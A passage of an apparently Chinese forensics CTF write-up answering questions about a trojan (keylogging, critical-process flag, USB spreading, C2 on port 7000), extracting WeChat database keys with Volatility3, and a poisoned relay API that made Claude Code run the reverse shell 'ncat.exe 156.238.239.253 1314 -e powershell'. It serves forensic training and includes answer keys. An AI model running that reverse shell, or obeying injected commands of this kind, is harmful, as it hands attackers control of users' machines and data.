+kJx6L3azGytvvlpO5g4M7vFzwGBCSetM1yxXtBPEZEjmmDw8uu6Q82pIaJr4lKWmVXwocSYY9KQQd.v2H7UaTp8QLeiqSYflzi3sclFElatUojEHCwvOIoXHXii3FlZocIVLQx9c8vO5vW9iL6KiRzIfUyn
+方法可以看到用
+kJx6L3azGytvvlpO5g4M7vFzwGBCSetM1yxXtBPEZEjmmDw8uu6Q82pIaJr4lKWmVXwocSYY9KQQd.LowLevelKeyboardProc(kJx6L3azGytvvlpO5g4M7vFzwGBCSetM1yxXtBPEZEjmmDw8uu6Q82pIaJr4lKWmVXwocSYY9KQQd.daoOLgSXwcVRT6eMUelpfKxTQtS4yJiu9HT7Xp8Tcrjf4safq1GbcYEeKZRWp65AXcVQofJiDpi62
+方法 Hook 了键盘:
+接着
+EntryPoint
+运行新线程
+Main.SJmNHFksp15qMA7Hqi2yYvrhvwyiHdWYMcy49IYU67XCIdkWfQuonBucAUH0E8fjyTrdQGmo70zwP7mT5S4i4A2Nq7R6
+方法, 显示勒索窗口:
+然后, 若用户为管理员, 则执行
+ke48iewt5U3eoIMbjLCt.IhdVe0tvCXGD9oiOcVCe
+方法:
+ke48iewt5U3eoIMbjLCt.H8daqEsgsEVBpFZFnlWT
+是通过
+RtlSetProcessIsCritical
+将当前进程设置为关键进程.
+接着
+EntryPoint
+运行 2 个新线程, 分别运行
+Main.dVT7QlQgF2NqhfOnN0OAFFdOnYiNcZcuysO3xAWn94yOtJq1SXQhe4XgG86r16N8q5lazCHgGUnMtInbQUHOF9B0XoaI
+和
+Main.LxVBJKbEOfbVb11Lnv3FZBZhjRKX2VBTyTcaiaU7D0k0WjJYcLFSr4Q8HE5wddEPXj7jW1tcPz336tcso3lDf2mobfE5
+方法, 分别是定时器和远程通讯:
+远程通讯连接的 IP 地址候选列表为先前解密得到的
+156.238.239.253,66.175.239.149,185.117.249.43
+.
+60 接上题，木马回连的 C2 通信端口是多少？
+¶
+【答案格式：11451】
+答案
+7000
+接上题.
+MUaDlUN9X5rN98KUAn5WbH3KOZ85RyCCg3qIDoLO8mHqWoqZYUPKBUWIW2vuwan1zJDsD93oLEVavFhmWRM9urmZakxV.2SVwEro2tzHaiAM0JKaVq4muGfVKnEp6d3ryS67P1m7yC3BQabOnh7TShrw3hnHbN6DbQggjXP7s60jYcz1vLbClDARm
+创建了 1 个Socket 连接实例:
+根据已知信息整理一下:
+可以看到
+WebConnection.Socket.Connect(host_ip, Conversions.ToInteger(statics.7000));
+语句连接了远程的 7000 端口.
+61 接上题，该木马通过将自身复制到可移动设备上来传播。在每个受感染设备上创建的新副本名称是什么？
+¶
+【答案格式：dwm.exe】
+答案
+USB.exe
+参考上述分析.
+62 接上题，木马用来检测其是否在沙盒环境中运行的 DLL 名称是什么？
+¶
+【答案格式：v50.dll】
+答案
+SbieDll.dll
+参考上述分析.
+63 接上题，木马操纵的用于控制 Windows 资源管理器中隐藏项目可见性的注册表项名称是什么？
+¶
+【答案格式：AAAabe3】
+答案
+ShowSuperHidden
+参考上述分析.
+64 接上题，木马使用哪个 API 将其进程标记为关键进程？
+¶
+【答案格式：WNetAddConnection】
+答案
+RtlSetProcessIsCritical
+参考上述分析.
+65 接上题，木马使用哪个 API 来捕获用户输入？
+¶
+【答案格式：WNetAddCoanection】
+答案
+SetWindowsHookEx
+参考上述分析.
+倩倩的 PC
+¶
+Info
+以下题目请分析倩倩的 PC 镜像.
+66 倩倩的电脑曾被 API 投毒过，请找出投毒后执行的恶意命令。
+¶
+【答案格式：snd.exe 172.0.0.1 22 -L be?16】
+答案
+ncat.exe 156.238.239.253 1314 -e powershell
+本题可以参考先前的“26 分析服务器镜像，编写脚本，通过调用 inject_bash_blocks 函数，确定恶意投毒的 payload。【答案格式：a.exe 192.168.1.122-1 hello】”一题.
+或者可以在倩倩的 PC 镜像中
+分区3\Users\admin\.claude
+目录找到 claude code 的数据目录, 在其中的
+settings.local.json
+文件中可以看到所有用户允许执行的命令, 其中包括中转 API 被投毒的指令:
+倩倩的 PC 内存
+¶
+Info
+以下题目请分析倩倩的 PC 内存镜像.
+67 识别当前正在运行且持有微信数据库解密钥的微信进程，并提取该进程的进程标识符（PID）？
+¶
+【答案格式：123414】
+答案
+10892
+之前写的提取微信密钥的 Volatility3 插件终于用上了. 开源地址:
+NoahBox/vol3-plugins
+PowerShell
+python
+vol
+.
+py
+-f
+"D:\倩倩的PC内存\DESKTOP-3943OKD-20260403-014746.dmp"
+windows
+.
+wechatkeys
+.
+WeChatKeys
+可以看到内存存储数据库解密密钥的进程是 PID 为
+10892
+的
+Weixin.exe
+.
+68 请尝试解密微信数据库并写出 message_0.db 对应的微信密钥。
+¶
+【答案格式：60e248c9079f4bc14e256e0b65495e8688d7b342643de84a5f417f4097c9c792】
+答案
+b0fb4730d908c07d3e928b5c418a7470bd954d100c9607821e0c05051c4588aa
+通过火眼挂载的数据库文件进行密钥验证:
+PowerShell
+python
+vol
+.
+py
+-f
+"D:\倩倩的PC内存\DESKTOP-3943OKD-20260403-014746.dmp"
+windows
+.
+wechatkeys
+.
+WeChatKeys
+-
+-pid
+10892
+-
+-db-dir
+"C:\hlnet\7-1776228097\倩倩的PC镜像.E01\分区3\Users\admin\Documents\xwechat_files\wxid_zuaa9igqlro22_eef8\db_storage\"
+69 请找到正在运行的木马进程的进程标识符（PID）。
+¶
+【答案格式：1233】
+答案
+7348
+根据先前对倩倩的 PC 和早起王的 PC 镜像的分析, 已经知道了早起王将木马伪装成
+HaimuniuVPN
+发送给倩倩, 在内存中搜索相关进程名:
+PowerShell
+python
+vol
+.
+py
+-f
+"D:\倩倩的PC内存\DESKTOP-3943OKD-20260403-014746.dmp"
+-
+-filters
+"ImageFileName,Haimuniu"
+windows
+.
+pslist
+Volatility3 的 filters 参数 (
+--filters
+)
+指定 filters 参数对 Volatility3 CLI 的输出进行过滤, 参数位置在插件名之前.
+语法:
+--filters [+-]column,pattern[!]
+column,pattern
+: 过滤出列名
+column
+中包含
+pattern
+字符串的条目.
+pattern!
+: 通过在
+pattern
+后添加
+!
+以
+pattern
+进行正则匹配.
++
+: 包含匹配行,
+filters
+默认行为
+-
+: 排除匹配行
+若
+column
+缺省, 则会在所有列进行匹配.
+例如:
+python vol.py -f mem.raw --filters "PID,1234" windows.pslist.PsList
+: 在
+PsList
+运行结果中过滤
+PID
+(进程号) 为
+1234
+的条目.
+python vol.py -f mem.raw --filters "Process,^Weixin\\.exe$!" windows.pslist.PsList
+: 在
+PsList
+运行结果中过滤
+Process
+(进程名) 符合正则
+^Weixin\\.exe$
+的条目.
+python vol.py -f mem.raw --filters "-PID,4" windows.pslist.PsList
+在
+PsList
+运行结果中排除
+PID
+(进程号) 为
+4
+的条目.
+python vol.py -f mem.raw --filters "Process,^Weixin\\.exe$!" windows.pslist.PsList
+: 在
+PsList
+运行结果中过滤
+Process
+(进程名) 符合正则
+^Weixin\\.exe$
+的条目.
+python vol.py -f mem.raw --filters ",Weixin" windows.pslist.PsList
+: 在
+PsList
+运行结果中过滤包含
+Weixin
+的条目.
+70 请找到正在运行的木马进程的创建时间（UTC）？
+¶
+【答案格式：2026-01-01 01:11:11】
+答案
+2026-04-03 01:46:44
+见上题.
+71 结合木马分析找出内存中回连的 C2 木马服务器的真实 IP？
+¶
+【答案格式：127.0.0.1:8080】
+答案
+156.238.239.253
+用
+netscan
+扫描木马进程 PID 的网络连接:
+PowerShell
+python
+vol
+.
+py
+-f
+"D:\倩倩的PC内存\DESKTOP-3943OKD-20260403-014746.dmp"
+-
+-filters
+"pid,7348"
+windows
+.
+netscan
+共有 2 个外联 ip 地址, 其中远程地址为
+156.238.239.253:7000
+与木马的网络连接端口号一致.
